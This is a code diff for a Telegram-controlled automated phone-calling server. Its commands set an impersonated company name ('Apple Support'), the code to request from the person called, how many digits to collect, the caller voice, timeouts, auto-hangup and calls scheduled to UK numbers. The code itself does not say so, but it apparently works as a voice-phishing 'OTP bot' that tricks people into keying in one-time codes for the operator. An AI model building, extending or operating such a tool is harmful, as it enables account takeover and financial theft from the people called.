       }
@@ -933,10 +1110,10 @@ Completed: ${stats().completedCalls}`);
       if (text.startsWith("/digits")) {
         const d = parseInt(text.split(" ")[1], 10);
         if (d >= 2 && d <= 10) {
-          db.settings.digits = d;
-          saveDB();
+          settings.digits = d;
+          saveSettings();
           await tgSend(`✅ ${d} digits set`);
-          await updatePanel();
+          markPanelDirty();
         } else {
           await tgSend("Use /digits 2 to 10");
         }
@@ -946,10 +1123,10 @@ Completed: ${stats().completedCalls}`);
       if (text.startsWith("/assistant")) {
         const a = parseInt(text.split(" ")[1], 10);
         if (a >= 1 && a <= assistants.length) {
-          db.settings.assistant = a - 1;
-          saveDB();
+          settings.assistant = a - 1;
+          saveSettings();
           await tgSend(`🎙 ${assistant().name} assistant set`);
-          await updatePanel();
+          markPanelDirty();
         } else {
           await tgSend("Use /assistant 1 to 6");
         }
@@ -961,10 +1138,10 @@ Completed: ${stats().completedCalls}`);
         if (!name) {
           await tgSend("Usage: /company Apple Support");
         } else {
-          db.settings.company = name;
-          saveDB();
-          await tgSend(`🏢 Company set to ${db.settings.company}`);
-          await updatePanel();
+          settings.company = name;
+          saveSettings();
+          await tgSend(`🏢 Company set to ${settings.company}`);
+          markPanelDirty();
         }
         return res.sendStatus(200);
       }
@@ -972,79 +1149,81 @@ Completed: ${stats().completedCalls}`);
       if (text.startsWith("/item")) {
         const name = text.replace("/item", "").trim();
         if (!name) {
-          await tgSend("Usage: /item ticket number");
+          await tgSend("Usage: /item booking code");
         } else {
-          db.settings.itemName = name;
-          saveDB();
-          await tgSend(`📝 Item set to ${db.settings.itemName}`);
-          await updatePanel();
+          settings.itemName = name;
+          saveSettings();
+          await tgSend(`📝 Item set to ${settings.itemName}`);
+          markPanelDirty();
         }
         return res.sendStatus(200);
       }
 
-      if (text.startsWith("/saveprofile")) {
-        const name = text.split(" ")[1];
-        if (!name) {
-          await tgSend("Usage: /saveprofile name");
+      if (text.startsWith("/maxretries")) {
+        const n = parseInt(text.split(" ")[1], 10);
+        if (n >= 1 && n <= 10) {
+          settings.maxRetries = n;
+          saveSettings();
+          await tgSend(`🔁 Max retries set to ${n}`);
+          markPanelDirty();
         } else {
-          db.profiles[name] = {
-            assistant: settings().assistant,
-            digits: settings().digits,
-            itemName: settings().itemName,
-            company: settings().company
-          };
-          saveDB();
-          await tgSend(`✅ Profile saved: ${name}`);
-          await updatePanel();
+          await tgSend("Usage: /maxretries 3");
         }
         return res.sendStatus(200);
       }
 
-      if (text.startsWith("/profile ")) {
-        const name = text.split(" ")[1];
-        if (loadProfile(name)) {
-          await tgSend(`📁 Profile loaded: ${name}`);
-          await updatePanel();
+      if (text.startsWith("/timeout")) {
+        const n = parseInt(text.split(" ")[1], 10);
+        if (n >= 3 && n <= 30) {
+          settings.inputTimeout = n;
+          saveSettings();
+          await tgSend(`⏱ Input timeout set to ${n}s`);
+          markPanelDirty();
         } else {
-          await tgSend("Profile not found");
+          await tgSend("Usage: /timeout 8");
         }
         return res.sendStatus(200);
       }
 
-      if (text === "/profiles") {
-        const names = Object.keys(db.profiles);
-        await tgSend(
-          names.length ? `📁 Profiles\n\n${names.join("\n")}` : "No saved profiles"
-        );
+      if (text.startsWith("/autoconfirm")) {
+        const n = parseInt(text.split(" ")[1], 10);
+        if (n >= 0 && n <= 600) {
+          settings.autoConfirmSec = n;
+          saveSettings();
+          await tgSend(`✅ Auto confirm set to ${n}s`);
+          markPanelDirty();
+        } else {
+          await tgSend("Usage: /autoconfirm 0");
+        }
         return res.sendStatus(200);
       }
 
-      if (text.startsWith("/deleteprofile")) {
-        const name = text.split(" ")[1];
-        if (!name || !db.profiles[name]) {
-          await tgSend("Profile not found");
+      if (text.startsWith("/autohangup")) {
+        const n = parseInt(text.split(" ")[1], 10);
+        if (n >= 0 && n <= 600) {
+          settings.autoHangupSec = n;
+          saveSettings();
+          await tgSend(`⛔ Auto hangup set to ${n}s`);
+          markPanelDirty();
         } else {
-          delete db.profiles[name];
-          saveDB();
-          await tgSend(`🗑 Deleted profile: ${name}`);
-          await updatePanel();
+          await tgSend("Usage: /autohangup 0");
         }
         return res.sendStatus(200);
       }
 
       if (text === "/pause") {
-        db.settings.paused = true;
-        saveDB();
+        settings.paused = true;
+        saveSettings();
         await tgSend("⏸ Calling paused");
-        await updatePanel();
+        markPanelDirty();
         return res.sendStatus(200);
       }
 
       if (text === "/resume") {
-        db.settings.paused = false;
-        saveDB();
+        settings.paused = false;
+        saveSettings();
         await tgSend("▶ Calling resumed");
-        await updatePanel();
+        markPanelDirty();
         return res.sendStatus(200);
       }
 
@@ -1055,12 +1234,13 @@ Completed: ${stats().completedCalls}`);
             await endLiveCallImmediately(c.sid);
             c.status = "Ended";
             c.endedAt = Date.now();
+            removeCallTimers(c);
           } catch {}
         }
-        db.settings.paused = true;
-        saveDB();
+        settings.paused = true;
+        saveSettings();
         await tgSend("🛑 All calls stopped and calling paused");
-        await updatePanel();
+        markPanelDirty();
         return res.sendStatus(200);
       }
 
@@ -1070,6 +1250,25 @@ Completed: ${stats().completedCalls}`);
           out += `${label}: ${number || "not set"}\n`;
         });
         await tgSend(out);
+        return res.sendStatus(200);
+      }
+
+      if (text.startsWith("/schedule")) {
+        const parts = text.split(" ").filter(Boolean);
+        const number = parts[1];
+        const delayRaw = parts[2];
+
+        if (!number || !delayRaw) {
+          await tgSend("Usage: /schedule +447xxxxxxxx 10m");
+        } else {
+          const delayMs = parseDelay(delayRaw);
+          if (!delayMs) {
+            await tgSend("Use delay like 30s, 10m, 1h");
+          } else {
+            scheduleOutboundCall(number, delayMs);
+            await tgSend(`⏰ Scheduled ${number} in ${delayRaw}`);
+          }
+        }
         return res.sendStatus(200);
       }
     }
@@ -1082,9 +1281,12 @@ Completed: ${stats().completedCalls}`);
 
 // ===== LIVE PANEL =====
 setInterval(() => {
-  if (panelMessageId) updatePanel();
+  if (panelDirty && panelMessageId) {
+    panelDirty = false;
+    updatePanel();
+  }
   cleanupEndedCalls();
-}, 1000);
+}, 1500);
 
 app.listen(PORT, () => {
   console.log("Server started");
